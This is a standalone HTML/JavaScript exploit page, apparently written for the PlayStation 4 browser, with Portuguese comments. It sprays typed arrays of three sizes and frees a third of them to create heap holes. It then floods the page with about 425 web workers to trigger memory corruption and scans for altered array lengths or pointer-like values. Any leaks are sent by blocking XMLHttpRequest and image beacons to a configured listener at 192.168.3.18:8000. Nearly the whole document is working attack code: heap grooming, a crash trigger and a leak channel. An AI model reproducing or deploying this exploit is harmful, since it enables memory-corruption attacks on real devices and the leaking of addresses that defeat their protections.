<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 POLYGLOT HUNTER (VARIABLE SIZES)</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 1.5em; border: 2px solid #fff; padding: 20px; margin: 20px 0; background: #202; }
        .phase1 { color: #0ff; }
        .phase2 { color: #ff0; }
        .impact { color: #fff; background: #f00; animation: pulse 0.1s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.8; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <h1>POLYGLOT HUNTER (3 SIZES)</h1>
    <div id="status">VERIFIQUE O IP!</div>

    <script>
        // --- CONFIGURAÇÃO ---
        const SERVER_IP = "192.168.3.18"; // <--- SEU IP
        const SERVER_PORT = "8000";
        
        const MAX_THREADS = 425;
        const PATTERN = 0xDEADBEEF;

        let workers = [];
        
        // Vamos criar 3 grupos de armadilhas
        let trapsA = []; // Pequenos
        let trapsB = []; // Médios
        let trapsC = []; // Grandes

        const url = URL.createObjectURL(new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'}));

        function start() {
            if(SERVER_IP.includes("XX")) return alert("IP ERRADO");
            
            document.getElementById('status').innerText = `ALVO: ${SERVER_IP}\nPREPARANDO TERRENO (VARIAÇÃO)...`;
            document.getElementById('status').className = "phase1";
            logToAndroid("INICIO_POLYGLOT");

            setTimeout(prepareMemory, 500);
        }

        function prepareMemory() {
            // Cria 3000 arrays de cada tamanho misturados
            // Padrão: A, B, C, A, B, C...
            try {
                for(let i=0; i<3000; i++) {
                    // Tamanho A (116 ints = 464 bytes + Header)
                    let a = new Uint32Array(116); a.fill(PATTERN); a[0]=0xA; trapsA.push(a);
                    
                    // Tamanho B (128 ints = 512 bytes + Header) - O padrão
                    let b = new Uint32Array(128); b.fill(PATTERN); b[0]=0xB; trapsB.push(b);
                    
                    // Tamanho C (140 ints = 560 bytes + Header)
                    let c = new Uint32Array(140); c.fill(PATTERN); c[0]=0xC; trapsC.push(c);
                }
            } catch(e) {}

            document.getElementById('status').innerText = "CRIANDO BURACOS HETEROGÊNEOS...";
            
            setTimeout(() => {
                // Swiss Cheese: Apaga 1 a cada 3 arrays de cada grupo
                // Isso cria buracos de tamanhos variados espalhados
                for(let i=0; i<trapsA.length; i+=3) {
                    trapsA[i] = null;
                    trapsB[i] = null;
                    trapsC[i] = null;
                }
                
                document.getElementById('status').innerText = "SCANNER ATIVO. SUBINDO THREADS...";
                document.getElementById('status').className = "phase2";
                logToAndroid("MEMORIA_PRONTA_SIZES");
                
                // Inicia Scanner Rápido
                setInterval(scanPolyglot, 30);

                // Começa o Ataque
                startThreads();
            }, 1000);
        }

        function startThreads() {
            let i = setInterval(() => {
                if (workers.length >= MAX_THREADS) { clearInterval(i); return; }

                workers.push(new Worker(url));

                if(workers.length % 10 === 0) document.getElementById('status').innerText = `THREADS: ${workers.length}`;

                if(workers.length === 400) {
                    document.getElementById('status').className = "impact";
                    document.getElementById('status').innerText = "IMPACTO (400+)";
                    logToAndroid("IMPACTO_POLYGLOT");
                    
                    // Aumenta frequência do scan no momento crítico
                    setInterval(scanPolyglot, 5); 
                }

            }, 35);
        }

        function scanPolyglot() {
            // Varre os 3 grupos
            checkGroup(trapsA, 116);
            checkGroup(trapsB, 128);
            checkGroup(trapsC, 140);
        }

        function checkGroup(group, originalLen) {
            // Varre com saltos para performance
            for(let k=0; k < group.length; k+=3) { // Checa só os que sobraram (não nulos)
                // Se k caiu num null (buraco), pula
                if(!group[k]) {
                    if(group[k+1]) checkOne(group[k+1], originalLen);
                    if(group[k+2]) checkOne(group[k+2], originalLen);
                    continue;
                }
                checkOne(group[k], originalLen);
            }
        }

        function checkOne(arr, originalLen) {
            // 1. CHECAGEM DE COMPRIMENTO (CORRUPÇÃO DE HEADER)
            // Se o length mudou, o kernel sobrescreveu o header!
            if(arr.length !== originalLen) {
                const lenHex = arr.length.toString(16);
                sendSync(`LEAK_LENGTH_CHANGE_TO_${lenHex}`);
                return;
            }

            // 2. CHECAGEM DE CONTEÚDO (NOS PONTOS CHAVE)
            // Checa offset 0, 4, 8, 16 (onde os ponteiros costumam ficar)
            if(arr[0] !== 0xA && arr[0] !== 0xB && arr[0] !== 0xC) report(arr, 0);
            else if(arr[4] !== PATTERN) report(arr, 4);
            else if(arr[16] !== PATTERN) report(arr, 16);
        }

        function report(arr, idx) {
            let val = arr[idx];
            // Se não é zero e não é nosso padrão
            if(val !== 0 && val !== PATTERN) {
                let hex = (val >>> 0).toString(16);
                // Filtro: Queremos ponteiros grandes
                if(hex.length > 5) {
                    sendSync(`LEAK_FOUND_VAL_${hex}`);
                }
            }
        }

        function sendSync(data) {
            // Envio Bloqueante (Trava a thread para garantir que sai antes do crash)
            const req = new XMLHttpRequest();
            req.open("GET", `http://${SERVER_IP}:${SERVER_PORT}/${data}`, false);
            req.send();
        }

        function logToAndroid(data) {
            new Image().src = `http://${SERVER_IP}:${SERVER_PORT}/${data}`;
        }

        setTimeout(start, 1000);

    </script>
</body>
</html>
